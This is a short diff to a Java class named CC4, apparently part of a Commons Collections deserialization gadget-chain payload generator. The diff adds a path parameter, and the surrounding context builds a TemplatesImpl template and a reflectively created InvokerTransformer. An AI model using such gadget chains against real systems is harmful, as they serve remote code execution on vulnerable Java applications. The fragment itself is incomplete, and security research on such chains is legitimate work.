@@ -11,8 +11,8 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 
 public class CC4 implements Gadget {
-    public Object getObject(String common) throws Exception {
-        TemplatesImpl template = TemplateUtils.getTemplate(common);
+    public Object getObject(String common,String path) throws Exception {
+        TemplatesImpl template = TemplateUtils.getTemplate(common,path);
         Constructor<InvokerTransformer> declaredConstructor = InvokerTransformer.class.getDeclaredConstructor(String.class);
         declaredConstructor.setAccessible(true);
         InvokerTransformer newTransformer = declaredConstructor.newInstance("toString");
